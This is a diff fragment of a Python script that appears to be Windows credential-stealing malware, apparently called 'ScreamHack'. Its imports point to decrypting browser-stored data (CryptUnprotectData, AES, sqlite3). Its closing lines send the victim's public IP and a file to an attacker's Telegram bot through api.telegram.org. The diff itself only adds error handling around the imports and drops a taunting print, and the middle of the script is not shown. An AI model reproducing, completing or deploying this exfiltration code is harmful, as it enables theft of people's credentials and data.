@@ -1,22 +1,25 @@
 token = "YOUR BOT TOKEN" #YOUR TOKEN HERE
 chat_id = "YOUR CHAT ID" #YOUR CHAT ID HERE
 
-import os
-import sqlite3
-import zipfile
-import requests
-from ctypes import *
-from winreg import *
-from json import load
-from os import listdir
-from shutil import copy
-from struct import calcsize
-from base64 import b64decode
-from Crypto.Cipher import AES
-from psutil import process_iter
-from win32api import GetModuleHandle
-from win32crypt import CryptUnprotectData
-import telebot
+try:
+    import os
+    import sqlite3
+    import zipfile
+    import requests
+    from ctypes import *
+    from winreg import *
+    from json import load
+    from os import listdir
+    from shutil import copy
+    from struct import calcsize
+    from base64 import b64decode
+    from Crypto.Cipher import AES
+    from psutil import process_iter
+    from win32api import GetModuleHandle
+    from win32crypt import CryptUnprotectData
+    import telebot
+except ImportError:
+    print("COMPILING ERROR! YOU ARE MISSING ANY LIBRARY")
 
 if __name__ == "__main__":
 
@@ -181,6 +184,3 @@ if __name__ == "__main__":
     bot = telebot.TeleBot(token)
     bot.send_message(chat_id, "ScreamHack: " + "\n" + "IP: " + requests.get('https://api.ipify.org').text)
     response = r.post("https://api.telegram.org/bot" + token + "/sendDocument", files=files, data=SendData)
-
-print("It's your fault.")
-input()
